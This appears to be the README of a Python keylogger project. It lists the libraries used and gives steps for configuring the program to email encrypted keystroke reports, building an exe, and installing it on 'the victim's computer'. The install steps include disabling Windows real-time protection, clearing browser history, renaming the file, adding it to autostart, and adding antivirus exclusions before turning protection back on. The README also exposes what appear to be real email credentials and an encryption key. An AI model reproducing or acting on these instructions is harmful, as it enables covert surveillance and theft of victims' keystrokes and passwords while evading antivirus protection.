# Keylogger

## Libraries used

```python
import platform
import smtplib
import socket
import threading
from cryptography.fernet import Fernet
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
```

## How to use

1. Run the GenerateKey.py program and in the folder where the program is saved, in the file encrypted_key.txt find the generated key, copy this key and then
paste in the keylogger.py program.
2. In the code of the keylogger.py program at the bottom, fill in the fields:
```python
SEND_REPORT_EVERY = 20 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "dysk2115@gmail.com"
EMAIL_PASSWORD = "Tutajwojtek1"
.
.
.
keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email",key="tKFQ4BGUYMR8iPH8otfSPy2z_uvhu7yQN3yL36cZy-E=")
```
3. Using the auto-py-to-exe program, we generate the keylogger exe file
4. Install the keylogger.exe program on the victim's computer (installation scenario)
5. After receiving an email with encrypted data, we copy it to the e_keys_logged.txt file,
In the DecryptFile.py program, we set the key and the path under which we have the file
e_keys_logged.txt. We run the program, as a result of the program's operation, it is created
keys_logged.txt file containing decrypted data from the victim's computer.

## How to install

1. Go to "Protection against viruses and threats", then under "Protection settings
from viruses and threats" click "Manage Settings" and then turn it off
"Real-time protection".
2. Downloading the exe executable file from the Internet, then removing the search from
history and renaming the file.
3. Pressing the System Button and the "R" key at the same time, typing "shell:startup" and
adding the exe file to the autostart folder.
4. Being in "Virus and threat protection settings" we find Exclusions and
click "Add or remove exclusions", add the exclusion as a file by selecting our file
exe (additionally, I also add the entire autostart folder to exclusions) located in
autostart directory.
5. Return to "Virus & Threat Protection Settings" , enable protection in
real time.

